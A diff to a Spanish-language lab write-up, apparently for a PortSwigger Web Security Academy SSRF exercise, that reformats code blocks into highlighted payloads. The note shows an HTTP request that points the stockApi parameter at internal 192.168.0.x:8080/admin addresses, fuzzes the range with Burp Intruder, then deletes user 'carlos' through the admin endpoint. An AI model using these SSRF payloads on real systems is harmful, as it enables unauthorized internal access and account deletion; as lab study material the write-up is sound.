@@ -18,18 +18,17 @@ tags:
 - **Entonces:** escaneo el rango privado `192.168.0.0/24` en el puerto `8080` hasta que uno responda con el panel.
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
 Poné el rango en `stockApi` y **fuzzeá el último octeto** con Burp **Intruder** (sniper, 1-255):
-```http
-POST /product/stock HTTP/1.1
-Host: LAB.web-security-academy.net
+<pre class="payload"><code>POST /product/stock HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 
-stockApi=http://192.168.0.§1§:8080/admin
-```
+stockApi=<mark>http://192.168.0.§1§:8080/admin</mark></code></pre>
 La IP que devuelva **200** (distinta a las "connection refused") tiene el panel. Después:
-```http
-stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
-```
+<pre class="payload"><code>stockApi=<mark>http://192.168.0.X:8080/admin/delete?username=carlos</mark></code></pre>
 > Alternativa en Python: [[vulnerabilities/007-ssrf/scripts/scan_internal.py|scan_internal.py]] itera el rango de forma async.
 
 ## Verificación
